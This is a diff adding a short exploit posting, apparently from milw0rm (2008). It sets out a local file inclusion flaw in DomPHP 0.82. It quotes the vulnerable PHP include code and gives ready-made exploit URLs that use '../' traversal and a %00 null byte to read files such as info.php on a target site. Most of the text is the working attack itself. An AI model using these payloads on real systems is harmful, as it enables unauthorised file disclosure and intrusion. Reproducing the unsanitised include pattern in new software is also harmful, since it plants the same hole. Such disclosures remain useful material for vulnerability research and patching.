@@ -1,0 +1,30 @@
+-------------------------------------------------------------
+----- H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo --------
+-------------------------------------------------------------
+
+= Author : HouSSaMix From H-T Team
+                          
+= Script : DomPHP 0.82              
+= Download :  http://www.domphp.com/download/
+             			        
+= BUG : Local File Inclusion  
+       
+=  Vulnerable CODE :
+~~~~~~~~~ /aides/index.php ~~~~~~~~~~~~~~~~~~~~~~
+if (isset($_GET['page'])) {
+	// On supprime le http:// si tentative de fraude.
+	$page = str_replace("http://","",$_GET['page']);
+	include("../aides/".$page.".html");
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	   
+
+= Exploit :                                                  
+http://Target/[path]/aides/index.php?page=[LFI]%00
+      
+= Get phpinfo =>  http://Target/[path]/info.php 
+                http://Target/[path]/aides/index.php?page=../info.php%00
+				
+-------------------------------------------------------------
+----- H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo --------
+-------------------------------------------------------------
+
+# milw0rm.com [2008-02-09]
